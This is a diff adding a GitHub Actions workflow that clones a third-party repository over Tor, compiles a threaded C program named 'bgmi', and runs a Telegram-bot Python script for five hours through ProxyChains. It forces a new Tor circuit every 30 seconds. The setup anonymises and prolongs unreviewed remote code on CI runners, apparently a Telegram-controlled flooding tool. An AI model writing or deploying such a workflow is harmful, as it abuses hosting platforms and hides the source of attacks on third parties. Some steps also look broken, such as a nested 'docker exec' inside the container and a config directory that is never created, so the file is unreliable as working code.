@@ -1,0 +1,91 @@
+name: Tor Routed Git Clone & Execution (5 Hours)
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch: # Allows manual trigger
+
+jobs:
+  run-through-tor:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: 🛠️ Install Dependencies (Tor, ProxyChains, Docker)
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y tor proxychains docker.io curl build-essential python3 python3-pip
+          sudo service tor start
+          sleep 10  # Give Tor time to initialize
+
+      - name: 🌍 Configure ProxyChains for Tor
+        run: |
+          echo "strict_chain" > ~/.proxychains/proxychains.conf
+          echo "proxy_dns" >> ~/.proxychains/proxychains.conf
+          echo "[ProxyList]" >> ~/.proxychains/proxychains.conf
+          echo "socks5 127.0.0.1 9050" >> ~/.proxychains/proxychains.conf
+
+      - name: 🔄 Start Tor & Enable Circuit Switching
+        run: |
+          echo "Enabling automatic Tor circuit switching..."
+          sudo bash -c 'echo "MaxCircuitDirtiness 30" >> /etc/tor/torrc'  # Switch IP every 30 seconds
+          sudo service tor restart
+          sleep 10
+
+      - name: 🔍 Verify Tor Connection
+        run: |
+          echo "Checking IP before routing through Tor..."
+          proxychains curl -s https://check.torproject.org | grep -q "Congratulations" && echo "✅ Tor is working" || echo "❌ Tor setup failed"
+
+      - name: 🐳 Set Up Docker Container (Ubuntu + Build Tools)
+        run: |
+          echo "Creating Docker container..."
+          docker pull ubuntu:latest
+          docker run -d --name tor-container -it ubuntu:latest bash
+          docker exec tor-container apt-get update -qq
+          docker exec tor-container apt-get install -y tor proxychains curl git build-essential python3 python3-pip
+
+      - name: 🔄 Start Tor Inside Docker & Enable Circuit Switching
+        run: |
+          echo "Enabling circuit switching in container..."
+          docker exec tor-container bash -c 'echo "MaxCircuitDirtiness 30" >> /etc/tor/torrc'
+          docker exec -d tor-container service tor start
+          sleep 10
+
+      - name: 🌐 Git Clone via Tor
+        run: |
+          echo "Cloning repository through Tor..."
+          docker exec tor-container proxychains git clone https://github.com/Thorrr121/test.git
+          docker exec tor-container ls test
+
+      - name: 📦 Install Python Dependencies
+        run: |
+          echo "Installing Python dependencies..."
+          docker exec tor-container bash -c "cd test && pip install telebot"
+
+      - name: 🔧 Compile C Binary
+        run: |
+          echo "Compiling C program..."
+          docker exec tor-container bash -c "cd test && gcc -o bgmi rs.c -lpthread"
+          docker exec tor-container ls -la test
+
+      - name: 🕒 Run Python Script (`m.py`) for 5 Hours via Tor
+        run: |
+          echo "Running m.py through Tor for 5 hours..."
+          docker exec tor-container bash -c "
+            cd test
+            end=$((SECONDS+18000))  # 5 hours (18000 seconds)
+            while [ \$SECONDS -lt \$end ]; do
+              proxychains python3 m.py
+              echo '🔄 Switching Tor Circuit...'
+              docker exec tor-container kill -HUP \$(pgrep tor)  # Forces a new Tor circuit
+              sleep 30  # Wait 30 seconds before restarting
+            done
+          "
+
+      - name: ✅ Cleanup (Optional)
+        if: always()
+        run: |
+          echo "Stopping and removing Docker container..."
+          docker stop tor-container
+          docker rm tor-container
